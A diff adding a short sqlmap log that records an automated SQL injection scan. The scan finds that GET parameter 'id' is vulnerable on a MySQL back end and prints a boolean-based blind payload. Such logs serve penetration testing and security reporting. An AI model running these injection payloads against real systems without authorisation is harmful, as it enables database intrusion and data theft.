@@ -1,0 +1,13 @@
+[03:21:04] [INFO] testing connection to the target URL
+[03:21:04] [INFO] testing if the target URL content is stable
+[03:21:05] [INFO] GET parameter 'id' appears to be injectable (with --string="x")
+[03:21:06] [INFO] the back-end DBMS is MySQL
+[03:21:07] [INFO] checking if the injection point on GET parameter 'id' is a false positive
+[03:21:08] [INFO] GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+[03:21:09] [INFO] sqlmap identified the following injection point(s) with a total of 27 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1' AND 6980=6980-- 
+---
